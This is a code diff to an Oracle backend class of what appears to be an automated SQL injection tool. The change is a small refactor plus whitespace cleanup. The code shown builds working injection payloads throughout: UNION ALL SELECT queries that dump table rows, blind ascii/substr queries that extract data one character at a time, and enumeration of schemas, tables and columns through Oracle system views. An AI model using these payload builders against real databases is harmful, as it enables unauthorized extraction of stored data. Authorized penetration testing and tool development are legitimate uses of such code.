@@ -33,44 +33,44 @@ class OracleMole(DbmsMole):
     integer_field_finger = 'ascii(chr(58)) + (length(' + DbmsMole.chr_join("1111111") + ') * 190) + (ascii(chr(73)) * 31337)'
     integer_field_finger_result = '2288989'
     integer_out_delimiter = '3133707'
-    
+
     def _schemas_query_info(self):
         return {
             'table' : '(select distinct(owner) as t from all_tables)',
             'field' : ['t']
         }
-    
+
     def _tables_query_info(self, db):
         return {
             'table' : 'all_tables',
             'field' : ['table_name'],
             'filter': "owner = '{db}'".format(db=db)
         }
-        
+
     def _columns_query_info(self, db, table):
         return {
             'table' : 'all_tab_columns ',
             'field' : ['column_name'],
             'filter': "owner = '{db}' and table_name = '{table}'".format(db=db, table=table)
         }
-    
+
     def _fields_query_info(self, fields, db, table, where):
         return {
             'table' : db + '.' + table,
             'field' : fields,
             'filter': where
         }
-    
+
     def _dbinfo_query_info(self):
         return {
-            'field' : ['user','banner','ora_database_name'], 
+            'field' : ['user','banner','ora_database_name'],
             'table' : 'v$version'
         }
-    
+
     @classmethod
     def dbms_name(cls):
         return 'Oracle'
-    
+
     @classmethod
     def dbms_check_blind_query(cls):
         return ' and 0 < (select cast(length(user) as varchar2(100)) from dual)'
@@ -100,18 +100,17 @@ class OracleMole(DbmsMole):
             query_list[injectable_field] = '(' + OracleMole.integer_field_finger + ')'
         query += ",".join(query_list) + ' from dual'
         return query
-        
+
     @classmethod
     def field_finger_trailer(cls):
         return ' from dual'
 
     def set_good_finger(self, finger):
         self.finger = finger
-        self.query = finger._query
 
     def to_string(self, data):
         return DbmsMole.chr_join(data)
-    
+
     @classmethod
     def field_finger(cls, finger):
         if finger.is_string_query:
@@ -122,7 +121,7 @@ class OracleMole(DbmsMole):
 
     def forge_count_query(self, column_count, fields, table_name, injectable_field, where = "1=1"):
         query = " and 1=0 UNION ALL SELECT "
-        query_list = list(self.query)
+        query_list = list(self.finger._query)
         query_list[injectable_field] = OracleMole.out_delimiter + '||cast(count(*) as varchar2(150))||' + OracleMole.out_delimiter
         query += ','.join(query_list)
         query += ' from ' + table_name + ' where ' + self.parse_condition(where)
@@ -130,7 +129,7 @@ class OracleMole(DbmsMole):
 
     def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = " and 1=0 UNION ALL SELECT "
-        query_list = list(self.query)
+        query_list = list(self.finger._query)
         query_list[injectable_field] = ("(" +
                                             OracleMole.out_delimiter +
                                             "||(" +
@@ -142,20 +141,20 @@ class OracleMole(DbmsMole):
         query += " from (select rownum r, " + ','.join(fields) + ' from ' + table_name + " where " + self.parse_condition(where) + ')'
         query += " where r = " + str(offset + 1)
         return query
-    
+
     def forge_integer_count_query(self, column_count, fields, table_name, injectable_field, where = "1=1"):
         query = " and 1=0 UNION ALL SELECT "
-        query_list = list(self.query)
-        query_list[injectable_field] = ('cast(cast(' + OracleMole.integer_out_delimiter + 
-                                       ' as varchar(10))||cast(count(*) as varchar(150))||cast(' + 
+        query_list = list(self.finger._query)
+        query_list[injectable_field] = ('cast(cast(' + OracleMole.integer_out_delimiter +
+                                       ' as varchar(10))||cast(count(*) as varchar(150))||cast(' +
                                        OracleMole.integer_out_delimiter + " as varchar(10)) as number(19))")
         query += ','.join(query_list)
         query += ' from ' + table_name + ' where ' + self.parse_condition(where)
         return query
-    
+
     def forge_integer_len_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = " and 1=0 UNION ALL SELECT "
-        query_list = list(self.query)
+        query_list = list(self.finger._query)
         query_list[injectable_field] = ("cast (cast(" +
                                             OracleMole.integer_out_delimiter +
                                             " as varchar(10))||cast(length(" +
@@ -167,10 +166,10 @@ class OracleMole(DbmsMole):
         query += " from (select rownum r, " + ','.join(fields) + ' from ' + table_name + " where " + self.parse_condition(where) + ')'
         query += " where r = " + str(offset + 1)
         return query
-    
+
     def forge_integer_query(self, column_count, index, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = " and 1=0 UNION ALL SELECT "
-        query_list = list(self.query)
+        query_list = list(self.finger._query)
         query_list[injectable_field] = ("cast(cast(" +
                                             OracleMole.integer_out_delimiter +
                                             " as varchar(10))||cast(ascii(substr(" +
@@ -182,16 +181,16 @@ class OracleMole(DbmsMole):
         query += " from (select rownum r, " + ','.join(fields) + ' from ' + table_name + " where " + self.parse_condition(where) + ')'
         query += " where r = " + str(offset + 1)
         return query
-    
+
     def blind_field_delimiter(self):
         return OracleMole.inner_delimiter_result
-    
+
     def _concat_fields(self, fields):
         return fields
-    
+
     def _do_concat_fields(self, fields):
         return ('||' + OracleMole.inner_delimiter + '||').join(map(lambda x: 'coalesce(cast(' + x + ' as varchar(150)),CHR(32))', fields))
-    
+
     def parse_results(self, url_data):
         if self.finger.is_string_query:
             data_list = url_data.split(OracleMole.out_delimiter_result)
@@ -201,13 +200,13 @@ class OracleMole(DbmsMole):
             return None
         data = data_list[1]
         return data.split(OracleMole.inner_delimiter_result)
-    
+
     def is_string_query(self):
         return self.finger.is_string_query
-    
+
     def forge_blind_query(self, index, value, fields, table, where="1=1", offset=0):
         return ' and {op_par}' + str(value) + ' < (select ascii(substr('+self._do_concat_fields(fields)+', '+str(index)+', 1)) from (select rownum r,'+','.join(fields)+' from '+table+' where ' + self.parse_condition(where) + ') where r = ' + str(offset + 1) + ')'
-        
+
     def forge_blind_count_query(self, operator, value, table, where="1=1"):
         return ' and {op_par}' + str(value) + ' ' + operator + ' (select count(*)  from '+table+' where '+self.parse_condition(where)+')'
 
